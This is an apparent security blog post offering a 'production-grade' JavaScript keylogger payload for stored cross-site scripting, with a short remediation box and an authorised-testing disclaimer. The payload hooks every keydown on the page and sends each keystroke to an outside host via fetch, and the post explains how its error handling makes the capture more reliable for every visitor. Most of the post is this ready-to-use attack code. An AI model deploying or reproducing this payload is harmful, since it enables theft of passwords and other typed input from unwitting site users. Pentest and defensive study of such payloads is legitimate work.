---
layout: single
title: "XSS — Stored Keylogger with Error Handling"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - keylogging
  - stored-xss
  - credential-capture
  - javascript
  - promise
  - fetch-api
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "A production-grade XSS keylogger that handles network errors gracefully and logs each keystroke with confirmation — designed for stored XSS contexts where persistence matters."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## Why Error Handling?

Basic keyloggers fail silently when the network hiccups — you lose keystrokes. This version uses Promise chaining to catch failures and log them to the console for debugging during a test.

## The Payload

```javascript
function logKey(event) {
  fetch("https://192.168.XX.XX/k?key=" + encodeURIComponent(event.key))
    .then(response => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response;
    })
    .then(data => {
      console.log("Key logged successfully:", event.key);
    })
    .catch(error => {
      console.error("Error logging key:", error);
    });
}

document.addEventListener("keydown", logKey);
```

## Key Differences from Basic Version

| Feature | Basic | This Version |
|---|---|---|
| Error handling | None | Promise `.catch()` |
| Encoding | Raw key value | `encodeURIComponent()` |
| Debug output | None | Console logging |
| Special chars | May break URL | Properly encoded |

## When to Use This

In **stored XSS** contexts — where your payload persists in the database and fires for every visitor — you want reliability. A missed keystroke from a network error in a basic keylogger is gone. This version logs the failure so you know to investigate.

<div class="remediation-box"><strong>Fix:</strong> Stored XSS requires input sanitisation before storage AND output encoding on render. Neither alone is sufficient. Use a security-reviewed HTML sanitiser like DOMPurify for any rich-text fields.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
